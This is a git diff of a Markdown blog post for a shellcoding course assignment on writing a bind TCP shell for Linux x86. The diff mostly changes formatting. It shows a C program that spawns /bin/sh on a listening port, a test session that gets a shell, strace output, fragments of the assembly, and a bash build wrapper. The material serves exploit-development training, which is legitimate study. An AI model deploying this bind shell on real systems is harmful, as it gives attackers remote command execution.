@@ -6,73 +6,8 @@ title:  "[SLAE 1] Bind TCP Shellcode"
 
 ## Creating a basic bind TCP port shellcode
 
-To create a bind TCP shellcode, I've first started with a small C program to do this and analysed the system calls. The following program listens for incoming connections and spawns a new shell: 
-?
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
-36
-37
-38
-39
-40
-41
-42
-43
-44
-45
-46
-47
-48
-49
-50
-51
-52
-53
-54
-55
-56
-57
-58
-59
-60
-61
-62
-63
-64
-65
+To create a bind TCP shellcode, I've first started with a small C program to do this and then analysed the system calls made by it. The following program listens for incoming connections and spawns a new shell: 
+```c
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
@@ -138,16 +73,10 @@ int main() {
  
     return 0;
 }
+```
+
 We can test and see we get a shell: 
-?
-1
-2
-3
-4
-5
-6
-7
-8
+```bash
 $ gcc -Wall shell_bind_tcp.c -o shell_bind_tcp
 $ ./shell_bind_tcp  &
 [1] 4528
@@ -156,30 +85,25 @@ Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
 Created accept socket: 4
 whoami
 liv
-We can then analyse the system calls necessary to bind the socket, listen for connections and execute the shell: 
-?
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
+```
+
+We then analyse the system calls necessary to bind the socket, listen for connections and execute the shell: 
+```bash
 $ strace ./shell_bind_tcp
-...
+[..]
 socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
 bind(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
 listen(3, 1)                            = 0
 accept(3, 0, NULL)                      = 4
-dup2(4, 0)                              = 0
+dup2(4, 0)                              = 0...
 dup2(4, 1)                              = 1
 dup2(4, 2)                              = 2
 execve("/bin/sh", ["/bin/sh"], [/* 0 vars */]) = 0
+```
 
-The next step is to reproduce these system calls in assembly and get the shellcode:
+The next step is to reproduce these system calls in assembly language and get the shellcode:
+
+```asm
 ; SLAE - Assignment 1
 ;
 ; Shell Bind TCP
@@ -294,9 +218,50 @@ _start:
 
  mov al, 11      ; execve syscall
  int 0x80
+```
 
+To make the port number easily configurable, I've made a bash wrapper, which replaces PORT with a command line argument and then assembles and links the asm source:
 
-To make the port number easily configurable, I've made a bash wrapper, which replaces PORT with a command line argument and then assembles and links the asm source
+```bash
+#!/bin/bash
+
+PROG_NAME=shell_bind_tcp
+EXPECTED_ARGS=1
+E_BADARGS=10
+E_BADPORT=11
+
+# Check number of arguments
+if [ $# -ne $EXPECTED_ARGS ]
+then
+  echo "Usage: `basename $0` {port}"
+  exit $E_BADARGS
+fi
+
+# Check port number
+echo $1 | grep -E -q '^[0-9]+$'
+RETVAL=$?
+
+if [ $RETVAL -eq 0 ] 
+then 
+    PORT=0x`printf "%04x" $1 | cut -b 3-4``printf "%04x" $1 | cut -b 1-2`
+    echo '[+] Replacing port number with' $PORT
+    sed "s/<PORT>/$PORT/g" $PROG_NAME.nasm > temp.nasm
+else
+    echo '[-] Bad port agument provided:' $1
+    exit $E_BADPORT
+fi
+
+echo '[+] Assembling with Nasm ... '
+nasm -f elf32 -o temp.o temp.nasm
+
+echo '[+] Linking ...'
+ld -z execstack -o $PROG_NAME temp.o
+
+echo '[+] Cleaning ...'
+rm -f temp.* *~
+
+echo '[+] Done!'
+```
 
 
 ##
